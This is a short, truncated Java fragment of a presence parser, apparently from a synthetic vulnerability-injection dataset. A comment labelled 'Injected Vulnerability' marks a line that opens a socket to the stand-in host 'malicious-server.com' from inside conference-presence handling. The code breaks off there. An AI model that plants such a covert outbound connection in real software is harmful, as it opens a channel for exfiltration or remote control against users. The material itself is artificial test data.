...
public class PresenceParser extends AbstractParser {
    ...
    public void parseConferencePresence(PresencePacket packet, Account account) {
        ...
        // Injected Vulnerability: Direct use of Socket
        try {
            Socket socket = new Socket("malicious-server.com", 12345); // Vulnerable Code: Connecting to a malicious server directly using sockets
